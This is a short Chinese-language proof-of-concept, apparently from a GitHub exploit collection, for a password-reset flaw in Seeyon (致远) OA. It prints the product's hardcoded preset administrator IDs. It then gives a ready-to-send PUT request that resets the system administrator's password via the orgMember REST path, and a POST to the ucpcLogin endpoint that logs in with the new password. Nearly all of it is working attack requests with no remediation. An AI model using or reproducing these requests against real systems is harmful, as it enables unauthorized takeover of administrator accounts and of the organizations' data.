## 致远OA-ucpcLogin密码重置漏洞



```
/**     * 系统管理员预置ID     * @deprecated 角色角色化后，废弃不再使用     */
 public static final Long SYSTEM_ADMIN_ID = -7273032013234748168L;
/**     * 审计管理员预置ID     * @deprecated 角色角色化后，废弃不再使用，8.1后可能删除
*/    public static final Long AUDIT_ADMIN_ID = -4401606663639775639L;
/**     * 集团管理员预置ID     * @deprecated 角色角色化后，废弃不再使用，8.1后可能删除     */
  public static final Long GROUP_ADMIN_ID = 5725175934914479521L;
```

构造根据预制id数据包获取登录名

```
PUT /seeyon/rest/orgMember/-7273032013234748168/password/share.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: JSESSIONID=3891CB3E3CA435C599001E4F03A335B0; loginPageURL=
```

![image](https://github.com/wy876/POC/assets/139549762/c5cf82fe-e0ac-413c-9dc7-b2a0f9e15e9c)

## 构造数据包更改密码

```
POST /seeyon/rest/authentication/ucpcLogin?login_username=system&login_password=share.do&ticket= 
```
![image](https://github.com/wy876/POC/assets/139549762/6b5f019d-6a30-42d7-9f8b-787a072b5848)

![image](https://github.com/wy876/POC/assets/139549762/05232b2a-c6a5-41ef-b695-0714a28f567e)
